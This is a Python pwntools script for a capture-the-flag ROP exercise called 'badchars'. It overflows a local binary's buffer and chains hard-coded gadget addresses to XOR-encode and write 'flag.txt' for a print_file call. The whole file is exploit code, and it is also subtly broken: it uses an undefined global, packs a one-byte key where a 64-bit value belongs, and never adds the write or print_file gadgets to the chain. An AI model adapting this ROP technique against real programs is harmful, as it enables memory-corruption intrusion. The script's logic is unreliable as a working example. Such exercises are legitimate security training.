#!/usr/bin/env python3
from pwn import *
import struct
import sys

nop = b"\x90"
null = b"\x00"

intkey = 0x0A
bytekey = b"\x0A" 

pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)
mov_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)
print_file = p64(0x0000000000400510)
data_sec = p64(0x0000000000601028)

payload = b""
badchars = bytearray(b"\x78\x67\x61\x2e")


def PrintBytes(label: str, buffer: bytes):
	print(label)
	print(''.join('\\x{:02x}'.format(x) for x in buffer))


def Generate(buffer: bytes, section: bytes) -> bytes:
	global payload
	global count

	array = []
	for i, c in enumerate(buffer):
		if c in badchars:
			array.append(i)
	if array:
		for i in array:
			buffer = buffer[:i] + (buffer[i] ^ intkey).to_bytes(1, 'big') + buffer[i + 1:]
			payload += pop_r14_r15 + bytekey + data_sec + xor_r15_r14

		return Generate(buffer, section)

	if buffer[-1]:
		buffer += null


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	length = 0x20
	Generate(b"flag.txt", data_sec)
	
	payload = nop * (length + 8) + payload

	p.send(payload)
	print(p.recvall())

